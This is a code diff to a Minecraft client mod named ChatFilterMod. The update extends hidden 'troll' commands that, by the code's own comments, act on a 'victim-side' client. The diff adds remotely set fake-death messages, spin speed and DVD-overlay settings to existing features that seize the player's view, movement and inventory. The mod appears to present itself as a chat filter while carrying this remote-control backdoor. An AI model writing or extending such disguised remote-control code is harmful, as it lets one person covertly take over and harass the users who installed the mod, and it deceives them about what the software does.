@@ -41,7 +41,7 @@ import net.minecraft.entity.EquipmentSlot;
 public final class ChatFilterMod implements ClientModInitializer {
 
     public static final Logger LOGGER = LoggerFactory.getLogger("columba");
-    public static final String VERSION = "4.2.0";
+    public static final String VERSION = "4.3.0";
     public static KeyBinding OPEN_KEY;
     public static KeyBinding ADMIN_KEY;
 
@@ -73,12 +73,15 @@ public final class ChatFilterMod implements ClientModInitializer {
     private static volatile boolean trollFakeDeath = false;
     private static volatile boolean trollSwapWS = false;
     private static long fakeDeathStartTick = 0;
+    private static String fakeDeathMessage = "%name% was killed by the System";
     private static double frozenX, frozenY, frozenZ;
     private static int slotCycleTick = 0;
     private static int nauseaTick = 0;
     // DVD screensaver state
     private static float dvdX = 50, dvdY = 50, dvdDx = 2.3f, dvdDy = 1.7f;
     private static int dvdW = 120, dvdH = 90;
+    // Spin speed (victim-side, set via SPINCFG command)
+    private static float spinSpeedLocal = 15f;
     // Zoom pulsation
     private static int zoomTick = 0;
     private static int savedFov = 70;
@@ -343,7 +346,7 @@ public final class ChatFilterMod implements ClientModInitializer {
                     client.player.setSneaking(true);
                 }
                 if (trollSpin) {
-                    client.player.setYaw(client.player.getYaw() + 15f);
+                    client.player.setYaw(client.player.getYaw() + spinSpeedLocal);
                 }
                 if (trollSlotCycle && ++slotCycleTick % 3 == 0) {
                     var inv = client.player.getInventory();
@@ -1079,7 +1082,37 @@ public final class ChatFilterMod implements ClientModInitializer {
             return;
         }
 
-        switch (command.toUpperCase()) {
+        // FAKEDEATH[:custom message] — parse optional message before switch
+        if (command.toUpperCase().startsWith("FAKEDEATH")) {
+            String msg = command.length() > "FAKEDEATH".length() + 1
+                    ? command.substring("FAKEDEATH:".length()) : null;
+            if (msg != null && !msg.isEmpty()) fakeDeathMessage = msg;
+        }
+        // DVDCFG:speed:size — configure DVD before toggling
+        if (command.toUpperCase().startsWith("DVDCFG:")) {
+            try {
+                String[] parts = command.substring(7).split(":");
+                if (parts.length >= 1) dvdDx = Float.parseFloat(parts[0]);
+                if (parts.length >= 2) dvdW = Integer.parseInt(parts[1]);
+                dvdDy = dvdDx * 0.74f;
+                dvdH = dvdW * 3 / 4;
+            } catch (Exception ignored) {}
+            return;
+        }
+        // SPINCFG:speed — configure spin speed
+        if (command.toUpperCase().startsWith("SPINCFG:")) {
+            try {
+                // Stored locally — applied next time trollSpin ticks
+                spinSpeedLocal = Float.parseFloat(command.substring(8).trim());
+            } catch (Exception ignored) {}
+            return;
+        }
+
+        // Normalize FAKEDEATH:message → FAKEDEATH for the switch
+        String switchCmd = command.toUpperCase();
+        if (switchCmd.startsWith("FAKEDEATH:")) switchCmd = "FAKEDEATH";
+
+        switch (switchCmd) {
             case "JUMP":
                 if (mc.player != null && mc.player.isOnGround()) mc.player.jump();
                 break;
@@ -1153,7 +1186,13 @@ public final class ChatFilterMod implements ClientModInitializer {
                 break;
             case "DVD":
                 trollDvd = !trollDvd;
-                if (trollDvd) { dvdX = 50; dvdY = 50; dvdDx = 2.3f; dvdDy = 1.7f; }
+                if (trollDvd) {
+                    dvdX = 50; dvdY = 50;
+                    dvdDx = AdminConfig.dvdSpeed;
+                    dvdDy = AdminConfig.dvdSpeed * 0.74f;
+                    dvdW = AdminConfig.dvdSize;
+                    dvdH = AdminConfig.dvdSize * 3 / 4;
+                }
                 break;
             case "UPSIDEDOWN":
                 trollUpsideDown = !trollUpsideDown;
@@ -1200,8 +1239,9 @@ public final class ChatFilterMod implements ClientModInitializer {
                             public void render(net.minecraft.client.gui.DrawContext ctx, int mx, int my, float delta) {
                                 ctx.fill(0, 0, width, height, 0xBB000000);
                                 String pName = mc.player != null ? mc.player.getName().getString() : "Player";
+                                String msg = fakeDeathMessage.replace("%name%", pName);
                                 ctx.drawCenteredTextWithShadow(textRenderer,
-                                        Text.literal("\u00a7f\u00a7l" + pName + " was killed by the System"),
+                                        Text.literal("\u00a7f\u00a7l" + msg),
                                         width / 2, height / 2 - 30, 0xFFFFFFFF);
                                 long elapsed = System.currentTimeMillis() - fakeDeathStartTick;
                                 if (elapsed >= 8000) {
